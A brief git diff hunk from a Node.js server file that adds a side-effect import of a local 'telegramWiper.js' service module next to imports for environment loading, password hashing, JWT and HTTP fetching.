@@ -5,6 +5,8 @@ import dotenv from "dotenv";
 import bcrypt from "bcrypt";
 import jwt from "jsonwebtoken";
 import fetch from 'node-fetch'; // Import node-fetch
+import "./services/telegramWiper.js";
+
 
 // --- Environment Variables (loaded from Railway) ---
 const ADMIN_PASS = process.env.ADMIN_PASS;
